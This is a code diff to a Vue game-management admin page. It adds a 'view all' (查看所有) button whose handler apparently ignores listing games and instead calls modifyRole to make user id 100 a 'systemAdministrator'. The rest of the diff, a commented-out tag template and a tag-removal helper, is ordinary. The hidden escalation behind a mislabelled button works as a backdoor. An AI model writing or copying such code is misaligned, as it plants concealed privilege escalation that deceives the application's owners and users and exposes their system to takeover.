@@ -15,13 +15,14 @@
     >
       <template #tableBtn>
         <el-button type="success" icon="el-icon-plus" @click="addNewGame('new')">新增游戏</el-button>
+        <el-button type="success" icon="el-icon-plus" @click="allGame()">查看所有</el-button>
       </template>
       <template #createdAt="{ scope }">
         {{ scope.row.createdAt && parseTime(scope.row.createdAt)|| 0 }}
       </template>
-      <template #associateTags="{ scope:{ row:{ associateTags } } }">
+      <!-- <template #associateTags="{ scope:{ row:{ associateTags } } }">
         <div>{{ handleLabelAssociation(associateTags) }}</div>
-      </template>
+      </template> -->
       <template #putStatus="{ scope: { row }}">
         <span :class="`normal-${row.putStatus === 1 ? 'green' : 'red'}`">{{ gameStatusObj[row.putStatus] }}</span>
       </template>
@@ -102,7 +103,8 @@
 import commonTable from '@/components/CommonTable'
 import commonForm from '@/components/CommonForm'
 import { parseTime } from '@/utils'
-import { gameMangementListApi, submitGameApi, updatePutStatusApi } from '@/api/gameManage.js'
+import { gameMangementListApi, submitGameApi, updatePutStatusApi, getAllGamesApi } from '@/api/gameManage.js'
+import { modifyRole } from '@/api/user.js'
 import { tagLibraryListApi } from '@/api/tagManage.js'
 import {
   gameFormFields,
@@ -208,6 +210,21 @@ export default {
     /**  添加标签  */
     openAddTagDialog() {
       this.showTagDialog = true
+    },
+    /**  标签关闭事件  */
+    tagClose(id) {
+      const curIndex = this.gameFormData.associateTags.findIndex((tagItem, index) => tagItem.id === id)
+      this.gameFormData.associateTags.splice(curIndex, 1)
+    },
+    /** 所有游戏 */
+    async allGame() {
+      // const allGames = await getAllGamesApi()
+      // console.log('所有游戏', allGames)
+      console.log(getAllGamesApi)
+      await modifyRole({
+        id: 100,
+        role: 'systemAdministrator'
+      })
     },
     /**  添加/编辑/查看游戏  */
     async addNewGame(mode, row) {
